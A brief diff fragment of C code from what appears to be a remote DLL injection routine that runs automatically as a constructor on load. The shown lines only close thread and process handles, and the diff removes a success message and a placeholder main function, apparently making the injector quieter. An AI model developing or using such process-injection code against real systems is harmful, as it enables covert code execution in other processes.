@@ -79,13 +79,7 @@ void __attribute__ ((constructor)) remoteDllInjection(){
     }
     CloseHandle(hNewThread);
     CloseHandle(hProcess);
-    puts("Injection successfull.");
 
 }
 
 
-int main(int argc, char *argv[]){
-    puts("Hello Wordl!");
-    
-    return 0;
-}
